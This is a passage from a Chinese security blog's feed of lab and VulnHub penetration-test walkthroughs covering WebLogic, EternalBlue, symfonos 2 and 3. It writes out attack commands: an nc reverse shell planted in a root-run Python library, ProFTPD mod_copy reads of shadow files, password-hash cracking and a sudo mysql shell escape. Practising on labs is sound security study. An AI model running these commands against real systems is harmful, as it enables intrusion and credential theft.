    
  </entry>
  
  <entry>
    <title>从外网 Weblogic 打进内网，再到约束委派接管域控</title>
    <link href="https://syst1m.top/2023/03/08/%E4%BB%8E%E5%A4%96%E7%BD%91-Weblogic-%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/"/>
    <id>https://syst1m.top/2023/03/08/%E4%BB%8E%E5%A4%96%E7%BD%91-Weblogic-%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/</id>
    <published>2023-03-08T06:03:02.000Z</published>
    <updated>2023-03-08T09:55:33.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此靶场来自 渗透攻击红队</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081404541.jpeg" alt="img"></p><p>域控桌面下有一个 Flag 文件，需要拿到即可通关</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="外网打点之-Weblogic-CVE-2017-10271"><a href="#外网打点之-Weblogic-CVE-2017-10271" class="headerlink" title="外网打点之 Weblogic-CVE-2017-10271"></a>外网打点之 Weblogic-CVE-2017-10271</h2><p>拿到目标,先扫一下c段,筛选出目标ip为192.168.1.16</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081418639.png" alt="image-20230308141844603"></p><p>继续扫端口,直接精准扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -Pn -T3 -sV -n -sT --open -p 22,1222,2222,22345,23,21,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,389,902,1194,1080,88 192.168.1.16</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081429120.png" alt="image-20230308142938095"></p><p>开放7001,无疑是weblogic了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081432282.png" alt="image-20230308143256257"></p><p>直接拿exp打,通过exp工具执行cs powershell上线cs<img src="https://raw.githubusercontent.com/chencicici/images/main/202303081538576.png" alt="image-20230308153805133"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081540937.png" alt="image-20230308154023911"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><h2 id="永恒之蓝拿下内网权限"><a href="#永恒之蓝拿下内网权限" class="headerlink" title="永恒之蓝拿下内网权限"></a>永恒之蓝拿下内网权限</h2><p>信息收集,发现有两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081550282.png" alt="image-20230308155002259"></p><p>发现内网10.10.20网段还有一台存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081552051.png" alt="image-20230308155234029"></p><p>丢个fscan上去扫一下,存在永恒之蓝</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081554474.png" alt="image-20230308155424450"></p><p>把我们的入口机上线到msf,搭个到10.10.20网段的跳板,然后打17010</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081558512.png" alt="image-20230308155827480"></p><p>把生成的payload拿去16那台入口机执行,让他上线msf,等一会,等他上线</p><p>拿到会话查看路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081614550.png" alt="image-20230308161426504"></p><p>添加路由,现在msf已经可以打到10网段了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081615156.png" alt="image-20230308161509127"></p><p>其实也可以直接用cs开启隧道,用msf直接打10网段,但是,无所谓啦~</p><p>注意这里要使用正向payload,因为靶机是连接不到我们的kali的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081620064.png" alt="image-20230308162050033"></p><p>直接就是system权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081622186.png" alt="image-20230308162210150"></p><p>继续上线到cs,做信息收集,这台win7是不出网的,要上线cs只能用转发上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081631652.png" alt="image-20230308163125621"></p><p>上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081647850.png" alt="image-20230308164740806"></p><h2 id="域打点"><a href="#域打点" class="headerlink" title="域打点"></a>域打点</h2><p>发现域</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081648242.png" alt="image-20230308164858212"></p><p>域内信息,一般dns服务器就是域控了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081651266.png" alt="image-20230308165144231"></p><p>确认域控为10.10.10.8</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081655629.png" alt="image-20230308165515590"></p><p>fscan进一步扫描这个网段,其实是有SQLserver的,不过要手动开一下,但是sqlserver过期了,直接寄</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081702600.png" alt="image-20230308170205558"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;此靶场来自 渗透攻击红队&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chenci</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="多层内网" scheme="https://syst1m.top/tags/%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>红队-多层内网环境渗透测试</title>
    <link href="https://syst1m.top/2022/12/24/%E7%BA%A2%E9%98%9F-%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://syst1m.top/2022/12/24/%E7%BA%A2%E9%98%9F-%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2022-12-24T05:46:22.000Z</published>
    <updated>2022-12-24T16:01:18.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶场来自 <a href="https://www.freebuf.com/articles/web/349557.html">https://www.freebuf.com/articles/web/349557.html</a></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先确定靶机ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241515767.png"></p><p>对靶机进行扫描,7001,不多说</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241517275.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>掏出利用工具,存在漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241527034.png"></p><p>写入一个冰蝎webshell,方便后面操作</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241528864.png"></p><h1 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>可以看到有两个网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241537045.png"></p><p>上线到cs进行内网信息收集</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241557372.png"></p><p>查看域信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241612034.png"></p><p>上传fscan进一步扫描漏洞,扫描出10.10.20.7存在17010</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241617024.png"></p><h2 id="会话传递"><a href="#会话传递" class="headerlink" title="会话传递"></a>会话传递</h2><p>把cs会话传给msf,打17010,新建一个监听器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241620692.png"></p><p>msf启动监听,payload要一致</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241621312.png"></p><p>新增会话,选择刚刚新建的监听器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241624854.png"></p><h2 id="msf隧道"><a href="#msf隧道" class="headerlink" title="msf隧道"></a>msf隧道</h2><p>添加路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241642712.png"></p><p>此时,msf已经可以访问10.10.20.0网段</p><p>这里要注意,使用正向payload</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241648214.png"></p><p>成功打下10.10.20.7</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241656149.png"></p><p>还存在另一个网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241702365.png"></p><h2 id="转发上线cs"><a href="#转发上线cs" class="headerlink" title="转发上线cs"></a>转发上线cs</h2><p>新建一个转发上线的监听器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212242247250.png"></p><p>生成后门,选择监听器为转发上线监听器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212242232706.png"></p><p>利用msf上传到windows7上</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212242238972.png"></p><p>后面都差不多,没啥意思就不继续了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶场来自 &lt;a href=&quot;https://www.freebuf.com/articles/web/349557.html&quot;&gt;https:</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="多层内网" scheme="https://syst1m.top/tags/%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>symfonos系列打靶-3</title>
    <link href="https://syst1m.top/2022/12/07/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-3/"/>
    <id>https://syst1m.top/2022/12/07/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-3/</id>
    <published>2022-12-07T07:20:41.000Z</published>
    <updated>2022-12-07T10:13:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机 <a href="https://www.vulnhub.com/entry/symfonos-3,332/">https://www.vulnhub.com/entry/symfonos-3,332/</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先确定目标ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071534925.png"></p><p>详细信息收集,这次倒是没有smb服务了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071539611.png"></p><p>开启了21,22,80端口,先看看首页吧,除了一张图没什么东西,爆破看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.109/   </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071550047.png"></p><p>emmm..没扫出东西来,换个扫描器换个字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.109/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071555609.png"></p><p>gobuster速度很快,但是扫描结果看着没dirsearch看着舒服</p><p>扫出一个gate目录,发现还是没东西,继续向下爆破二级目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.109/gate -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071602597.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071603627.png"></p><p>还是没东西,继续向下爆破三级目录,没东西了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071605078.png"></p><p>换个字典,继续爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.109/gate/cerberus -w /usr/share/wordlists/rockyou.txt -t 50 --no-error</span><br></pre></td></tr></table></figure><p>似乎有点东西了,继续向下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071611305.png"></p><p>又发现几个目录,毫无用处…</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071618713.png"></p><p>看了wp,真是日了狗了,还得是你啊dirb</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071620057.png"></p><p>换gobuster继续跑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.109/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --no-error</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071641708.png"></p><p>终于等到你,这是一个uptime命令的回显</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071643849.png"></p><p>加上路径&#x2F;cgi-bin,应该是shellshock漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。</span><br><span class="line">在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。</span><br><span class="line">简单来说就是由于服务器的cgi脚本调用了bash命令，由于bash版本过低，攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「悬镜安全」的原创文章，遵循CC <span class="number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/Anprou/</span>article<span class="regexp">/details/</span><span class="number">72819989</span></span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>msf找payload来打</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071659895.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿到会话,suid有个ping,是有机会提权的,但是要用到gcc,目标没有gcc,上提权脚本<a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20221204">linpeas.sh</a></p><p>本地起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>靶机去下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.31.54/linpeas.sh</span><br><span class="line"><span class="built_in">chmod</span> +x ./linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure><p>没看到可用点,传个pspy上去看看进程,还是一样的传法</p><p>uid&#x3D;0就是root,这个python脚本没有权限查看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071745448.png"></p><p>但是我们可以抓包看看,他在做什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">tcpdump -D</span><br><span class="line">tcpdump -w ftp.pcap -i lo <span class="comment">#127走回环口</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071750717.png"></p><p>然后把数据包传回来分析,还是一样的用py起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="comment"># py2</span></span><br></pre></td></tr></table></figure><p>锁定21端口找啊找,翻到一个密码 hades  PTpZTfU4vxgzvRBE</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071754578.png"></p><p>直接ssh方便一点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh hades@192.168.31.109  </span><br></pre></td></tr></table></figure><p>常规提权操作无果,直奔ftpclient.py</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071759772.png"></p><p>可以看到引入了一个库 ftplib,尝试修改这个库,达到提权的效果,因为这个脚本是以root权限运行的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name ftplib.* 2&gt;/dev/null <span class="comment">#把错误信息抛出</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071803671.png"></p><p>继续跟进,可以看到root和gods组是可以修改的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071805111.png"></p><p>写入反弹shell的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&quot;nc -nv 192.168.31.118 5555 -e /bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071809610.png"></p><p>kali监听等待回弹</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071810968.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机 &lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-3,332/&quot;&gt;https://www</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="smb信息收集" scheme="https://syst1m.top/tags/smb%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="librenms" scheme="https://syst1m.top/tags/librenms/"/>
    
  </entry>
  
  <entry>
    <title>symfonos系列打靶-2</title>
    <link href="https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-2/"/>
    <id>https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-2/</id>
    <published>2022-12-05T12:39:28.000Z</published>
    <updated>2022-12-07T07:26:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机 <a href="https://www.vulnhub.com/entry/symfonos-2,331/">https://www.vulnhub.com/entry/symfonos-2,331/</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h2><p>首先找到目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052043179.png"></p><p>收集端口详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.31.58 </span><br></pre></td></tr></table></figure><p>开放端口蛮多,还有135和445,切入口应该在这里了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052046798.png"></p><h2 id="smb信息收集"><a href="#smb信息收集" class="headerlink" title="smb信息收集"></a>smb信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.31.58</span><br></pre></td></tr></table></figure><p>存在一个匿名目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052049850.png"></p><p>进去看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.58/anonymous -U % -N</span><br><span class="line">-U 指定用户 %表示用户</span><br><span class="line">-N 空密码</span><br></pre></td></tr></table></figure><p>存在一个log.txt下载下来看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052051462.png"></p><p>给了几条线索,1.将shadow备份到&#x2F;var&#x2F;backups下 2.smb配置文件给出一个密码 3.给出proftp配置</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052053197.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052056925.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052058612.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052100072.png"></p><p>前面nmap扫描给出了ftp的版本,看看能否找到漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052106932.png"></p><p>有利用限制,只是可以复制文件,并不能rce而且需要知道真实路径</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="任意文件复制"><a href="#任意文件复制" class="headerlink" title="任意文件复制"></a>任意文件复制</h2><p>根据上面的log.txt我们得到了匿名用户的真实路径 &#x2F;home&#x2F;aeolus&#x2F;share</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052111240.png"></p><p>利用漏洞可以复制文件,账号密码任意</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.31.58</span><br><span class="line">site cpfr /var/backups/shadow.bak</span><br><span class="line">site cpto /home/aeolus/share/shadow.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052117238.png"></p><p>上smb下载下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052118620.png"></p><p>利用同样的方式复制&#x2F;etc&#x2F;passwd文件,再下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.31.58</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">site cpto /home/aeolus/share/passwd.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052122563.png"></p><h2 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a>爆破hash</h2><p>先把两个文件复制到目录,再写入同一个文件</p><p> unshadow 会结合&#x2F;etc&#x2F;passwd的数据和&#x2F;etc&#x2F;shadow的数据，创建1个含有用户名和密码详细信息的文件。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /root/.john                                                                                                                                       </span><br><span class="line"><span class="built_in">cp</span> passwd.txt shadow.txt ./.john                                                                                                                                       </span><br><span class="line"><span class="built_in">cd</span> .john                        </span><br><span class="line">unshadow passwd.txt shadow.txt &gt; hash.txt                                                </span><br></pre></td></tr></table></figure><p>使用john爆破hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/.john</span><br><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p>爆破出一个账号 aeolus  sergioteamo</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052130948.png"></p><p>ssh上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.31.58 -l aeolus</span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo -l找到一个提示</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052137717.png"></p><p>跟进,得到提示</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052137237.png"></p><p>没什么用…suid也没东西,看看端口netstat没有这个命令</p><p>上传提权脚本,因为我们是ssh上去的,直接复制进去就行了 <a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><p>执行发现,存在nmap工具</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052156377.png"></p><p>直接扫自己,发现一个不对外开放的端口和mysql,用nc端口转发将本地的8080转发到5555,访问一下看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> backpipe p ; nc -l -p (远程端口) &lt; backpipe | nc (本地ip) (被转发的端口) &gt;backpipe</span><br><span class="line"><span class="built_in">mknod</span> backpipe p ; nc -l -p 5555 &lt; backpipe | nc 127.0.0.1 8080 &gt;backpipe</span><br><span class="line">或者</span><br><span class="line">socat TCP-LISTEN:5000,fork,reuseaddr tcp:127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052157459.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052207419.png"></p><p>访问5555端口,转发成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052208130.png"></p><p>得知cms版本,使用msf尝试提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052219373.png"></p><p>sudo找到一个suid命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052219634.png"></p><p>mysql提权方法 <a href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052220301.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机 &lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-2,331/&quot;&gt;https://www</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="smb信息收集" scheme="https://syst1m.top/tags/smb%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="librenms" scheme="https://syst1m.top/tags/librenms/"/>
    
  </entry>
  
  <entry>
    <title>symfonos系列打靶-1</title>
    <link href="https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-1/"/>
    <id>https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-1/</id>
    <published>2022-12-05T06:27:35.000Z</published>
    <updated>2022-12-05T07:59:56.000Z</updated>
    
